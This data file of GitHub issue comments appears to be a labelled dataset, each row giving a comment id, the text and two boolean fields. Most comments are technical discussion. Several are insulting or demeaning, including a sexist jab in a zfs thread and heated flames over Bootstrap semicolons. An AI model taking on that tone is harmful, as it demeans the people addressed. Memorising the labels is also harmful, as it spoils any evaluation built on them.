rails/rails/33677/415040253,rails/rails/33677,"I think the question here should be is replacing  and  with  and  a better option? If presented with the word  and , which is most likely self-explanatory as to the action to be performed? ",False,True
bootstrap/twbs/3057/5138103,bootstrap/twbs/3057,"@friend that's wonderful, can you please implement it as well for the YUI compressor, googles closure compiler, dean edwards packer and microsoft ajax minifier? ",False,True
zfs/zfsonlinux/7960/457885294,zfs/zfsonlinux/7960,"@friend I was about to send some patches in, including this one, but apparently someone with oper rights in the channel was feeling like a primadonna and decided to issue a ban over hurt feelings related to a comment about the semantics of the word 'mostly'.... after PMS'ing around other folks. Did not seem like someone technically involved in the project, but he went ahead and did the same in -social. Therefore, odds are you did not get a message in the channel mentioning another issue that is present with the spl debug code (without further analysis it looks like misuse of snprintf(), leading to a single byte leak, but I haven't verified this proper). Holding on to the patches for now. ",False,True
i2cdevlib/jrowberg/252/281191801,i2cdevlib/jrowberg/252,"Hi everyone, is there any progress on this task? I am using the library as well and not only with UNO but also with DUE; which has a more powerful ARM based microcontroller and although everything is fine with the raw values, it crashes after a while of usage in the DMP6 version. What ever TWBR or FIFO rate I tried did not matter, waiting approx 2 min (max) results crash. ",False,True
NanoCore/NanoAdblocker/87/356444124,NanoCore/NanoAdblocker/87,"Filter lists can limit the amount of domains each rule apply to with many ways. If you need to set a different set of filter lists for each domain, then chances are the filter lists you are using are kind of broken.  And there isn't a reasonable way to swap filter lists sets internally. ",False,True
WarBugs/WarEmu/13182/456614578,WarBugs/WarEmu/13182,Does this mean I get one of those bug report tokens for the griffon mount in Altdorf? ,False,True
zfs/zfsonlinux/7401/379866988,zfs/zfsonlinux/7401,"No, actually you're going the other way around. Then you would need patch gnulib. Easier going back to unsorted from a recent version. ",False,True
ansible/ansible/13262/322496406,ansible/ansible/13262,"Thanks for that update @friend. I don't presume to know what's going on behind the scenes or what's currently being prioritized. You guys have done an excellent job creating, IMO, the best configuration management tool on the market. I trust you all to make good decisions on the direction of the project going forward just as you have so far. My comments were only intended to ensure that there is awareness of the popularity of this issue since there has been very little communication to the community up to this point that would reflect that awareness. Just informing us as you just did that you are aware it's a very popular issue, but still aren't prepared to tackle it internally satisfies me, and I hope many others as well, that you are listening and have the information you need to make the best decision in this regard. ",False,True
moose/idaholab/12263/427486554,moose/idaholab/12263,"Yeah, an input file. Lots of data already is in the outputs. We'll be using Chigger for various tasks here anyways. For reading global values form exodus files for example. If requested we can even use it as one of the output plugins to generate plots. ",False,True
hockeyapp/shuhongwu/22840/214359736,hockeyapp/shuhongwu/22840,"Version 7.1.0 (3117) | com.sina.weibo Reason No reason found. Full stack trace includes libsystem_malloc.dylib, libobjc.A.dylib, ???, libdyld.dylib, CoreFoundation, Foundation, UIAccessibility, libdispatch.dylib, libsystem_pthread.dylib. Link to HockeyApp  ",False,True
bootstrap/twbs/3057/5177887,bootstrap/twbs/3057,"@friend ""only a few painters would work with tools that have terrible glitches"", again a value-judgement about painters that only plumbers share, because they value utility over everything else, so of course ""glitches"" are a deal-breaker.  Painters will literally paint with excrement if they feel like it... and every now and then they turn excrement like JavaScript into something amazing (remember the original Prototype.js? a work of art in its day... or underscore.js now) ",False,True
AKS/Azure/132/409624781,AKS/Azure/132,You can track the addition of multiple node pools here ,False,True
ansible/ansible/13262/327911917,ansible/ansible/13262,"@friend I feel like that's pretty clear. Currently blocks are processed at build time, and they would need to instead be processed on the fly at execution time. That sounds like a pretty fundamental change to me, with potential performance implications. ",False,True
bootstrap/twbs/3057/5140102,bootstrap/twbs/3057,"@friend shouldn't be adding a semicolon because it makes the codebase too big. People keep complaining ""Boo hoo hoo, twitter is so bulky and laggy!"", and then they contradict themselves by requesting the codebase get larger with needless semicolons. smh, people these days.... ",False,True
cdnjs/cdnjs/8137/223670289,cdnjs/cdnjs/8137,@friend don't need to use this PR template next time. ,False,True
minitest/seattlerb/779/371324137,minitest/seattlerb/779,"In #757 the following exchange happened  want to motivate the position @friend has. My exact test scenario is this  I am tested a random member of an array that comes back from an API. I am comparing the equality of the member's data with the represented object's method response (something like . These should always be equal, but sometimes both are . One thing I might do is modify my  cassette so that there are no  values, but I would rather have the data represent reality. I would advocate for maintaining 's current behavior rather than having this kind of test fail in Minitest 6. ",False,True
bootstrap/twbs/3057/5137063,bootstrap/twbs/3057,"Forcing unwanted paradigms has no business in code reviews. Tools that reformat code can break code if the code is dependent on whitespace. Javascript is dependent on whitespace due to semicolon insertion. Javascript minification is not part of the language. So the code is correct for the author and they should not use a tool that breaks it. I agree that the code runs and my first statement speaks to the freedom of an author to do as they wish. The freedom to code as they see fit. Those are compelling reason to NOT change it. However, the reality is that very few individuals will use the code unminified and the question of ""correctness"" falls to common convention as a matter of pragmatism. The middleground is to add a semicolon for general use of the code. Branch it and have a nice bootstrap-dropdown-minification_safe.js - There's nothing wrong with changing the code as you see fit to meet your needs. Do not demand to change a tool because you want to use the tool in a way another author has explicitly said they will not support. That's hypocrisy. That's why people are getting upset. ",False,True
lxqt/lxqt/1628/441444196,lxqt/lxqt/1628,@friend The discussion became futile. Please close this! ,False,True
rails/rails/1917/1476959,rails/rails/1917,I've made the change in docrails ,False,True
nixpkgs/NixOS/32080/355016555,nixpkgs/NixOS/32080,Probably a duplicate of #30590 ,False,True
PocketMine-MP/pmmp/2187/390037882,PocketMine-MP/pmmp/2187,"The template exists for the sake of structured communication of an issue. If you want an issue resolving, then provide the information we ask for. How we deal with issues created ourselves is not relevant to this subject. ",False,True
code-d/Pure-D/29/182521380,code-d/Pure-D/29,Might have been this issue  updating workspaced &amp; code-d now ,False,True
eXpand/eXpandFramework/176/425667006,eXpand/eXpandFramework/176,hmm you are right my bad sorry ,False,True
zfs/zfsonlinux/7401/379552574,zfs/zfsonlinux/7401,Can someone who can repro this try bisecting the changes between 0.7.6 and 0.7.7 so we can see which commit breaks people? ,False,True
bootstrap/twbs/3057/5146239,bootstrap/twbs/3057,"""Functional"" code, valid syntax So you think we should write code like these just because it has a valid syntax? ",False,True
coc.nvim/neoclide/305/450471379,coc.nvim/neoclide/305,"Hmm, I think current signature display can only work nice on overload selection happening at opening parentheses, not before like now, when signatureHelp with current option didn't even start. ",False,True
react-helmet/nfl/373/447939847,react-helmet/nfl/373,"Please everyone, give @friend a rest or pay him money for working on this issue. Everyone can fork this lib and patch the code or switch to react-helmet-async or use an object for configuration. There are a lot of alternatives. ",False,True
AKS/Azure/287/397724405,AKS/Azure/287,"plus one for this. I'm also interested in using different node pools for security reasons, like single tenancy for Vault. ",False,True
Corrupted/GameThemedGroup/5/229252528,Corrupted/GameThemedGroup/5,"void    clear() Deletes all GridElements and reset the counter void    clear(boolean clearGrid, boolean clearCounter, boolean clearLaser) flexible clear method void    clearGrid() Deletes all GridElements ",False,True
bootstrap/twbs/7482/16069390,bootstrap/twbs/7482,&lt;code&gt;hgroup&lt;/code&gt; would not have been more appropriate as it promotes a markup anti-pattern of using multiple headings when not needed.  h1-h6 do not make good subheadings/subtitles/taglines. ,False,True
Skript/SkriptLang/1568/425569487,Skript/SkriptLang/1568,"what does that have to add anything? this is super vague What code are you using for that 'other leaderboard', what version, etc. ",False,True
officer/davidgohel/141/400863875,officer/davidgohel/141,"Sorry, but your corrected code also doesn't work. I get empty final.docx. I use R version 3.4.4 (2018-03-15) Platform x86_64-pc-linux-gnu (64-bit) Running under Manjaro Linux other attached packages [1] magrittr_1.5  officer_0.3.1 officer package installed from cran ",False,True
ansible/ansible/13262/185932399,ansible/ansible/13262,plus one this would be a really useful feature ,False,True
ansible/ansible/13262/335478286,ansible/ansible/13262,"@friend this shouldn't have been closed, it should have been marked as waiting on contributor. ",False,True
oh-my-zsh/robbyrussell/4069/113824587,oh-my-zsh/robbyrussell/4069,"@friend it's not considered solved. I implemented a solution but never got to posting it, sorry joy I'm submitting my PR now, please feel free to test it (I'll be posting test instructions as well soon) #4071. ",False,True
vscode/Microsoft/14668/346637490,vscode/Microsoft/14668,"To keep the number of issues in our inbox on a manageable level, we're closing issues that have been on the backlog for a long time but haven't gained traction We look at the number of votes the issue has received and the number of duplicates issues filed. Thanks for your understanding. Happy coding! ",False,True
i2cdevlib/jrowberg/252/311983297,i2cdevlib/jrowberg/252,"This is a good data point, but it does not conclusively indicate a problem in I2Cdevlib code. The code from arduino.cc example, for instance, does not use the DMP, so the MPU itself is operating mode without making use of its internal processor. Since this issue has focused on failure case when the DMP is active, that's a significant difference. All comments on this issue referring to raw data access only (no DMP) indicate that the I2Cdevlib code is rock solid. Unless the freezing problem also happens when using I2Cdevlib code for only raw accel/gyro readings, @friend's case does not actually add new information to what we have already seen. Also, the I2Cdevlib code adds some (very) small processing overhead to each I2C transaction since it is another layer of function call abstraction around the core TWI hardware. Given the seemingly random nature of the freeze failures, it is possible that unpredictable small timing differences have an effect on whether the failure case occurs. If this is happening, it still does not necessarily mean that I2Cdevlib code has a defect, but only that I2Cdevlib code increases the probability of conditions necessary for the problem to occur. To get back to the fundamental point here  MPU6050 latching SDA low is a violation of I²C protocol, as @friend pointed out. The Wire library has an internal blocking infinite while loop with no timeout/cancel mechanism. I2Cdevlib code has no blocking infinite while loops itself, and cannot break out of the one in the Wire library..  In other words  The MPU6050 is doing something it shouldn't, and The Wire library does not accommodate this behavior cleanly, and I2Cdevlib cannot fix this without requiring a dedicated hardware timer or else rewriting or replacing the Wire library itself, which is technically possible but outside the current scope of the project and would necessarily compatibility with current and previous Arduino installations.  I am all for clean, bug-free code, but I have yet to identify any potential root cause(s) for this behavior in I2Cdevlib. The true root cause appears to be in the MPU itself, or might be worked around (or at least detected) with a Wire library improvement or kludge like testing  inside the while loop. Detecting and mitigating the problem at the I2Cdevlib layer while still using the Wire library as-is would require a prohibitively complex and resource-intensive addition of timers and interrupts. This type of fix would be more suitably (and just as easily) added to the main application logic rather than the I2Cdevlib code, since 99% of the time it would be irrelevant for other I2Cdevlib users. ",False,True
framework/laravel/15443/247326629,framework/laravel/15443,please WRITE APPROPRIATE FRAMEWORK OR  DO NOT WRITE ANYTHING ok ? Well despite your attitude i'll paste this comment from stackoverflow ,False,True
jekyll/jekyll/6948/419921211,jekyll/jekyll/6948,"It would be great if  would take preference over . So that you could , and include  and do fast iterations over a single page. This is also how e.g.  and other unix tools operate, and more useful than the (current) other way around, because by default. This was also reported in ticket  but stalled as it would be a breaking change. Seems like 4.0 would be a perfect moment. What do you say @friend? (cced as he was planning to work on it) ",False,True
eXpand/eXpandFramework/176/361943206,eXpand/eXpandFramework/176,"Hello, The Excel Importer is a really nice feature and I would like to ask for new features. Well two nice features would be.  parameter before import defining if non existing data from reference should be created or not. (if not so this should be considered like error)  A progress bar informing the status. I imported 1.5k of records with 20 columns. It worked goot but for 45 seconds I did not know what was happening.    BR ISA ",False,True
angular.js/angular/1463/10791720,angular.js/angular/1463,"Quoting might be a good solution. My question is where the quoting/dequoting would occur. I believe $http is the low level transport. From my point of view, the  ideal solution would be to have $http quote and dequote the identifiers.  That way it would be transparent to my python (mongodb) application. My  angular application would see +$oid as an identifier, but that wouldn't  be so bad. \$ would be a more traditional way to quote it. ",False,True
AKS/Azure/132/393363970,AKS/Azure/132,"This seems like a reasonable request for this feature, as if you are still pre prod you will not need/want to run large costly vm's, once load-testing and such starts then you'll want to upgrade to prod size vm. The fact that you have to create another cluster to set the real vm size seems to defeat the purpose os modular and configurable kubernetes. ",False,True
eXpand/eXpandFramework/176/425667141,eXpand/eXpandFramework/176,"However, in the update and create scenario, it is really important to have an understanding of what happened after importing large and complex files (this has been requested a lot) - ",False,True
npm/npm/20791/392624281,npm/npm/20791,"👍  Me too. For those looking for a workaround, yarn still seems to be healthy. ",False,True
bootstrap/twbs/3057/5204074,bootstrap/twbs/3057,"Some PHP... this output Actually, nobody on the PHP community write code like that.  Because all PHP programmers know better... ",False,True
vagrant-riak-cluster/hectcastro/2/13026556,vagrant-riak-cluster/hectcastro/2,This pull request adds support for Riak Control via a wrapper cookbook for the riak cookbook. The main purpose of the wrapper cookbook is to generate SSL certificates for Riak Control. ,False,True
moose/idaholab/12263/427485257,moose/idaholab/12263,Ok - I'm calling it.  Let's not discuss this anymore until I get back.  This will go better in person with @friend and @friend . ,False,True
Elgg/Elgg/12126/410159755,Elgg/Elgg/12126,Thanks for taking the time to test and provide feedback. It is always a bit of a guessing game what could cause your problems. We have been doing upgrade paths from different version and in different ways. It would be helpfull if you could try to stay with us for a few more tests. To get a few things clear  Are you using a regular LAMP installation? Which PHP / Mysql version Does your db account has rights to manage the database Do you have some aggresive OPcode caching installed? Are you upgrading with the Elgg caching options enabled? is  set in your config (settings.php) could you remove your cache folders before upgrading?  ,False,True
bootstrap/twbs/3057/8403922,bootstrap/twbs/3057,@friend epic win on an already hilarious thread D ,False,True
vuejs.org/vuejs/974/369416042,vuejs.org/vuejs/974,"Yes I agree that issue is not serious in practice and many WCAG requirements and not perfect and sometimes they even not possible to implement (but they often have grounds which you even may not suspect about). I can also agree it probably does not affect assistive technologies (in most cases). However I would like to mention accessibility != WCAG 2.0. and I have wrote  the citation from that page  markup languages, errors in element and attribute syntax and failure to provide properly nested start/end tags lead to errors that prevent user agents from parsing the content reliably. Therefore, the Success Criterion requires that the content can be parsed using only the rules of the formal grammar."" I am not sure what you mean while talking about accessibility, but WCAG 2.0 is landmark There are requirements for government organisations in NSW to be WCAG 2.0 AA complaint. And organisation's sites are either complaint or not. It would be risky to fix all issues and at the end find out the main framework causes problems by design. What if some company decide an application does not pass 4.1.1? Should we rewrite everything then? Or create some patches modifying attributes before vue is loaded? Really? I can hardly imagine that. ",False,True
code-d/Pure-D/29/223069055,code-d/Pure-D/29,No idea. Did you try compiling workspace-d with LDC instead? ,False,True
mapbox-studio-classic/mapbox/1083/50716877,mapbox-studio-classic/mapbox/1083,Seeing an OS X only test failure ( Logging here until I have time to investigate ,False,True
FastAdapter/mikepenz/695/401852409,FastAdapter/mikepenz/695,"Its basically the interface for the implementation that is managing the items list. You could for example add an own add implementation and call own calculated adapter callbacks. There is currently no documentation for it, thats true. Your implementation would look similar to the default one but without the default behavior you don't want to have. ",False,True
AKS/Azure/132/414930936,AKS/Azure/132,"Once you scale or upgrade the Kubernetes version, the nodes are reverted to the original size, and you will have to resize again. ",False,True
opensource-socialnetwork/opensource-socialnetwork/1365/432748724,opensource-socialnetwork/opensource-socialnetwork/1365,"Like seriously i don't understand the clean directory order than the public_html/ where i unzipped the file already create the database and i have seen the installation where to insert the database credentials, have done all that before i ran into that You don't have permission to access n////installation////installation////installation/ on this server. Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request. Please help to break it down ",False,True
rdpwrap/stascorp/611/447327251,rdpwrap/stascorp/611,"Hey guys, I had the same issue as @friend. Adding both snippets breaks TermService start. What solved it for me is using the full ini file @friend provided in its templates zip. My ini was just the last update from 2018.10.10, but I guess there must have been some differences.  I also tested using the full ini from  and can confirm that it does not work. Thank you @friend ! ",False,True
pyinstaller/pyinstaller/3160/355040521,pyinstaller/pyinstaller/3160,Nice attitude. You bypassed my request to change documentation. Not always a developer need code encryption for ear money... I will do a lot of copy and paste of the link to this bug. Bye all ,False,True
classroom/education/1678/432795426,classroom/education/1678,"Sorry but I must disagree, misbehavior comes not from github itself, but from interaction with classroom. It's blocking/limiting use of your classroom software. Yes it is on the borderline but just saying it's not your problem and closing issue is not constructive. ",False,True
npm/npm/20791/392620832,npm/npm/20791,Same here. ,False,True
full-stack-project/ga-wdi-boston/505/264187652,full-stack-project/ga-wdi-boston/505,"no, still working on it ",False,True
METADATA.jl/JuliaLang/7295/267066934,METADATA.jl/JuliaLang/7295,You really should not change sha of existing tags. How did Travis pass on the original PR? ,False,True
minitest/seattlerb/757/381843544,minitest/seattlerb/757,It looks like you already use the latest version of rspec-rails. ,False,True
rdpwrap/stascorp/611/447327491,rdpwrap/stascorp/611,I confirm. Works ,False,True
ARKStatsExtractor/cadon/850/446818149,ARKStatsExtractor/cadon/850,"and here is a Tek Stego, which also works  ",False,True
composer/composer/7526/410733739,composer/composer/7526,"For some of your use-cases there are already existing work-arounds. In other cases, we simply do not support it. This discussion will lead nowhere. ",False,True
termux-packages/termux/2735/412878919,termux-packages/termux/2735,"@friend I did this, but I don't have any problems...  Successful installation   Successul execution of 'startarch'    Ok, there signal 1 generated, but are you sure that it is from tar ? ",False,True
bootstrap/twbs/9501/30891910,bootstrap/twbs/9501,"plus one If this is to be removed, then the regular .divider class should be removed too. It makes no sense to drop one and not the other, keep or drop the whole divider idea. Personally I really find them useful - as mentioned above, they are used to great effect when resizing to xs views, where the dividers can be transformed into horizontal ones. ",False,True
i2cdevlib/jrowberg/252/262477556,i2cdevlib/jrowberg/252,"@friend I have similar problems on Arduino nano. Arduino freeze after variable time and it depends on inv_set_fifo_rate.  It run cca 20 minutes when I set 0x04, but it is too slow for me. After reading this thread I started experimenting with TWBR. I use your sketch and now I have 100Hz fifo rate and TWBR 103, sketch is running more than 1 hour without problem. I don't know why, but may be it helps you. ",False,True
opentoonz/opentoonz/346/220823967,opentoonz/opentoonz/346,I agree this is annoying and needs to be fixed. There is a small workaround ( if you do not already know it ) ). -open the style editor. -then select the memo text and you should get arrow at the side  this will give you the text properties which will allow you to reapply the the colour with the style editor. ,False,True
i2cdevlib/jrowberg/252/264811153,i2cdevlib/jrowberg/252,I bought original Arduino nano on friday. Same code run till discharge of battery (cca 6hrs) on 100Hz.  @friend you are right. Thank you;) Mr. Rowberg thank's for your patience. I hope you find solution of clone troubles. And thank's for your libraries. ,False,True
rails/rails/1917/1488067,rails/rails/1917,"The exception is still there because if you don't have an API client you can override the handler method and make it raise that same exception.  This was covered in the release notes. On Fri, Jul 1, 2011 at 322 PM, sztywny reply@friend.github.com wrote --  Cheers Koz ",False,True
bootstrap/twbs/3057/5137413,bootstrap/twbs/3057,"This minifies just fine via Rails' asset precompiling - I've never ran into an issue with it. IMHO, this is my issue with JavaScript as a language being much too flexible and forgiving. ",False,True
bootstrap/twbs/3057/20235530,bootstrap/twbs/3057,"There might be something else we want to focus on, leave the semicolons alone.  ",False,True
pyinstaller/pyinstaller/3160/355031525,pyinstaller/pyinstaller/3160,"If you want this to be fixed, please place an adequate(!) bounty or submit a pull-request. The requirement for byte-encryption is a commercial one (free software does not require byte-encryption since the cod is available anyway). So if you are earning money with using PyInstaller you should take parts of the development. ",False,True
jekyll/jekyll/6948/415078430,jekyll/jekyll/6948,"@friend You don't have to duplicate 99 lines for each environment specific config file. When you specify multiple config files at build Jekyll daisy chains them from left to right. Meaning you could have a production config with all settings, and then for your staging and dev configs just add the lines that are unique or change. Jekyll will use everything from the first config, and override whatever comes next. For example, say you have _config.yml (production settings with all configs) and then a staging specific config (e.g. When you run  you'd get the prod , if you run You'd get the staging  along with all the other variables set in . ",False,True
rdpwrap/stascorp/601/445547091,rdpwrap/stascorp/601,"Despite the description of @friend I don't seem to get it working in 17763.168 So I got the 2018-10-10 rdpwrap.ini, added two sections for .168 and .168-SLinit, copying the data from the 165 and .165-SLInit respectively. net stop termservice net start termservice and … termservice crashes.. I did not fiddle with the dlls. (BTW still fighting with virusscanner too -- maybe this disturbes things as well?) ",False,True
Elgg/Elgg/2553/13660169,Elgg/Elgg/2553,"cash wrote on 40836433-06-13 unauthenticated session? Elgg does not store anything of value in an unauthenticated session and that session is destroyed when the user logs in. If you meant authenticated session, yes I did. No, I'm not calling session_id(). If you do that after the session has been started, you destroy the session. I pass the session id as 'Elgg' in the form. If session.use_only_cookies is off, PHP will use that when starting the session. The only way to use session_id() is to call it before the session library runs its init function which I think happens on the boot event. Elgg does not load plugins until after the boot event. You have 2 options pass the session id as I've done or pass enough information to log in the user/catch the action token failure. The action handler needs some better logic for handling token failures but that is a different issue(#2602). Please do not reopen this again. ",False,True
A3-Antistasi/A3Antistasi/57/394397956,A3-Antistasi/A3Antistasi/57,"These are my notes of the params I Will add, pls do not hesitate to suggest a few more Load last Save def Yes Server membership (Overriden upon Load) def Yes. Switch Comm Def yes. TK Punish Def Yes. Mission Radius Def 4Kmts (4,8,12) Allow PvP def No Allow player markers def Yes AI Skill def Medium (mult 0.5,1,2) No of same ítems in Arsenal to unlock def 25 (15,25,50) Civ Traffic Level def Medium (mult 0.5,1,2) So if the server is started by an admin he Will be able to tweak whatever, if not, the default values are applied, and those are suitable for open dedis, no conflict with anything. From there, JiP players Will see the traditional Load window for their personal saves, and nothing else. ",False,True
Flexbones/roikles/61/186262270,Flexbones/roikles/61,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php ,False,True
bootstrap/twbs/3057/5191244,bootstrap/twbs/3057,I came here to say this; ,False,True
systemd/systemd/3162/152057115,systemd/systemd/3162,Follow-up for #3152. ,False,True
zfs/zfsonlinux/7401/379878349,zfs/zfsonlinux/7401,"It might be significant that we hit the zap expansion limit at 2048 files (unclear if this is because of the coreutils sorting, or the zap hash function, though). ",False,True
zfs/zfsonlinux/7401/380212322,zfs/zfsonlinux/7401,"@friend I have spent a fair amount of time explaining things to end users on Hacker News, Reddit and Phoronix. I do not think that our understanding is sufficient to post a final FAQ yet, but we could post an interim FAQ. Until then, you could point users to my hacker news post  specific, we need to nail down whether existing files could be lost, what if any other side effects happen when this is triggered, what course of events leads to directory entries disappearing after ENOSPC, whether those are just new ones or old ones too, how system administrators could detect it and how system administrators will repair it. Then we should be able to make a proper FAQ entry. Until then, I think the interim FAQ entry should advise users to upgrade ASAP to avoid having to possibly deal with orphaned files if nothing has happened yet, or more orphaned files if something has already happened; and not to change how they do things after upgrading unless they deem it necessary until we finish our analysis, make a proper fix, and issue proper instructions on how to repair the damage in the release notes. I do not think there is any significant harm to pools if datasets directory sizes are wrong and orphaned files exist while they wait for us to release a proper fix with instructions on how to completely address the issue, so telling them to wait after upgrading should be fine. ",False,True
ansible/ansible/13262/322464336,ansible/ansible/13262,"@friend It won't prevent notification if you will create the filter correctly, but I get your point ). ",False,True
jekyll/jekyll/6948/383729613,jekyll/jekyll/6948,@friend Let’s keep this restricted to Jekyll features. We don’t have any control over GitHub Pages. ,False,True
bootstrap/twbs/3057/5147222,bootstrap/twbs/3057,"No, I don't think anybody should be writing code with sloppy, ignorant, or obfuscated syntax.  Hell, I reformat open-source code so braces line up and if statements are properly enclosed in braces and so forth. But the fact remains If the language compiler accepts it, then it should still compile after any preprocessing.  It may suck stylistically, but take that up with the language author. ",False,True
Semantic-UI-React/Semantic-Org/2550/373074400,Semantic-UI-React/Semantic-Org/2550,"Valid point @friend, @friend. Since this issue was not picked up quickly for work, I have submitted a quick PR to update the README.md in #2644 linking here to alert people until we get a patch on this. Fingers crossed, I am hoping to at minimum get the modal working with 2.3 over the weekend. ",False,True
RestSharp/restsharp/865/233670463,RestSharp/restsharp/865,"Hi again, tried once more with exact your code .. and it doesn't work .. So, my research leaded me to request.Resource = ""customer""; request.RootElement = ""customer""; you are marking root element as Customer, but deserializing to GetCustomerByCustomerIdResponse So, RS will get only customer object from content and trying to create GetCustomerByCustomerIdResponse object from it. Well, it won't fit, so default. To fix it, deserialize to Customer class or just comment those two lines, then it will work. (Tested both.) ",False,True
bootstrap/twbs/3057/5140085,bootstrap/twbs/3057,"i'm 100% with @friend on the semicolons, but don't understand the benefit of writing the very fragile when is shorter and is clearer, and neither break as easily. ",False,True
minecraft-bugs/tryashtar/864/339511911,minecraft-bugs/tryashtar/864,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Nov 3, 2012 Duplicate of [MC-61] ",False,True
bootstrap/twbs/13327/40260002,bootstrap/twbs/13327,"Slow your roll @friend. Your question isn't about Bootstrap in particular, it's about bundling and an MVC tool that we have absolutely no context for. @friend is 100% correct in pointing you elsewhere with an issue like this. We'll need more than a textual description to help you. The docs and source code clearly show usage of  elements. The CSS is dependent on a list HTML structure, too. There's no way this works on a  without some modifications or other errors in the codebase. Can you create a jsbin example that reproduces your problem? ",False,True
python-sdk/leancloud/289/273419553,python-sdk/leancloud/289,Current coverage is 85.41% (diff 85.00%) ,False,True
Ghost-CLI/TryGhost/678/374479131,Ghost-CLI/TryGhost/678,"Falsely accusing someone being not respectful is a serious defamation. That's shame you personally attack others in order to defend your lack of basic knowledge. My issue is not with installing , but running it from your cli. My issue #678 is related, if not duplicate of issue #378, that was correctly marked as bug by less ignorant and more knowledgable ghost developers than you two. I was respectful until now, but at this point you showed that you don't deserve any kind of respect. At this point, I've lost the interest of ghost, so I've lost the interest in this bug report aswell. No regards. ",False,True
flood/jfurrow/240/391799933,flood/jfurrow/240,"Note by disabling user authentication (IF you don't replace it with another authentication method like PAM for example) you will also disable multi-user capabilities. So if you have 3 users and you suddenly change the config to disable authentication, what should happen? Keep the 1st user and remove all others? No, this is nonsense. I think it should not be possible to disable authentication but only to switch to another mechanism like PAM or authentication forwarding to a reverse proxy like nginx. ",False,True
Ant-Media-Server/ant-media/579/381864713,Ant-Media-Server/ant-media/579,"Hi there, I don't know if it's the proper place to ask this kind of questions, let me know if you'd rather have this published somewhere else. I'm currently doing some research on media streaming servers to integrate live streaming into Funkwhale, the project I'm working on. Ant media server looks like a really good pick for my use cases, but I'm not sure how to ensure viewers cannot hijack a stream. When creating a Stream in the interface, you can  Copy the RTMP publish url, like rtmp//localhost/LiveApp/499481361945988697107161,  being the Stream ID Copy the player embbed code, like ,  being the stream ID, the same one as in the publish URL  Since the Stream ID is used for publishing purposes, but also shared with viewers, my understanding is that any viewer can easily guess the publish URL by inspecting the player source and potentially hijack a stream. I may be completely wrong or missing something, but I'd like to double check that with you. Is this normal behaviour? Is there another way to achieve what I need (having a non guessable rmtp publishing link)? I can see that there is another issue linked to authentication ( but my idea was that providing a different, non guessable URL (with a different ID, but binded to the same stream) for viewing / publishing. Let me know if you need additional info, and thank you for the incredible work! ",False,True
primitive/haskell/71/354082694,primitive/haskell/71,"@friend not that the issue has anything to do with stack but ... considering the amount of work for creating and maintaining (tracking all git repo update) a stack snapshot for something that is ephemeral, I think the likely outcome is that it won't happen, lowering the amount of testing GHC alpha gets and the feedback GHC Devs gets back. Even if that stack snapshot happens, who will sweat to add this to their travis which will have to be undone once 8.4 is released ? I think if you don't use the same mechanism of delivery for everything then you're making the testing bar way too high already. Clearly if there's no release of  (and other basic packages), I don't think anyone should bother with alpha or beta releases (haskellers or GHC devs) compared to say, testing GHC git repo directly. ",False,True
scratch-blocks/LLK/1840/450720456,scratch-blocks/LLK/1840,"This is a different type of opt-in though. We should not shift the hard decision making to the children, that's not fair on them. The responsibility is ours, not theirs. By all means, keep the block with a disclaimer for those language pairs where the error rate is extremely low. I'd still like to have my locale removed though, because gibberish translations are no use to everybody, and we will be unintentionally teaching this gibberish. The disclaimer should also be short ( a lot shorter than my draft) to make it easy to read. Otherwise, kids will just go tl;dr on it. ",False,True
pycodestyle/PyCQA/703/343180953,pycodestyle/PyCQA/703,"I'm not sure if you're intentionally ignoring my suggestion to include it in the  list for your projects or if you just want to try to argue. Either way, I'm not here to argue with you. Pycodestyle is a tool used by novices and experts alike. Novices will learn from this and so will some experts. Since this is a style tool, there will always be places where some people disagree with the checks and will disable them. That's normal. Just because a handful of folks object to a rule doesn't mean we will put it in the  list even if generally speaking it has value for everyone else. As for the suggestion that pyflakes entertain a style check, you can make that argument to them, but that is typically entirely against their philosophy. ",False,True
core/owncloud/27775/301330172,core/owncloud/27775,"It might be a part, but a minor part and everyone is free to choose other installation methods better fitting / providing to their use case. And how should people get familiar / into that into the first place? If everyone would think like this and would never start then there would be progress in IT at all... 😉 ",False,True
react-popper/FezVrasta/111/379500148,react-popper/FezVrasta/111,"I'm taking care of the problem here, for free. ",False,True
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357410271,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942,"Having redundant menus display isn't a good UX. Perhaps you missed the point of the feedback.  My feedback is that by implementing that option and when a user enables it they now have two display.  On Google's web app, that isn't an issue because only one is ever displayed.  So if you're going to implement an option such as that, make sure it doesn't introduce a double menu or bad design.  Do you want feedback or not?  based on the tone of your response, it doesn't appear that way. ",False,True
rdpwrap/stascorp/611/447131589,rdpwrap/stascorp/611,"Hello Kasim Ahmic –  there is normally no need to tackle manually with the termsrv.dll. Did you go straight forward  first with the KB4471332 (10.0.17763.194)  which does an update from termsrv.dll.001  or dll.165 or dll.167  to dll.168 ( …but keeps in case you had been already updated to  .168  ( e.g. done  with the  windows10.0-kb4469342-x64_7290815610ac4c3d657eb5ed6e4e92421fa8c29a.msu  , ""Package_for_RollupFix"" version=""17763.168.1.10"") which leads also to an Termsrv.dll.168  ) The same happens when you update the OS from .168 to .194 (KB4471332) {keeps the termsrv.dll.168) I do assume you are on win 10x64-1809-17763-194 at this time  and you had seen the termsrv.dll.168 and validated the  Version   ( see my crc-listing 3-17763_rdpRule.CRC.txt in the Zip-file) and for now are on termsrv.dll.001 ( manually) As you did so –  I assume you solved the  elevated privileges ( manually or either by a „Tool“). To circumvent the stumbling Stones of the „System“ Access Rights. Did you also Keep an eye on your „Virusscanner“ as some of these “good Boys“ are sensitive and reluctant for exchanging/touching System Files and also registry data. (win-defender is not reluctant). Now It is time  Change the termsrv.dll.001  back to „Normal .168“ Ensure the correctness with following elevated cmd „Certutil -hashfile CWindows\system32\termsrv.dll  -md5“ (-md5 , -sha1 – doesn’t matter in the „3-17763_rdpRule.CRC.txt“  are known crc-data in) You may also verify the property data of CWindows\system32\termsrv.dll   Props 10.10.17763.168  - size 1019392 - date2018-12-04 Another file(s)  of interest is/are CWindows\system32\rfxvmt.dll     Props 10.10.17763.1       - size 40960     - date2018-09-15 CWindows\syswow64\rfxvmt.dll     Props 10.10.17763.1       - size 32768    - date2018-09-15 Remark BUT the syswow64\rfxvmt.dll may be added by your RDP Wrapper V.1.62 with an older date (Up till 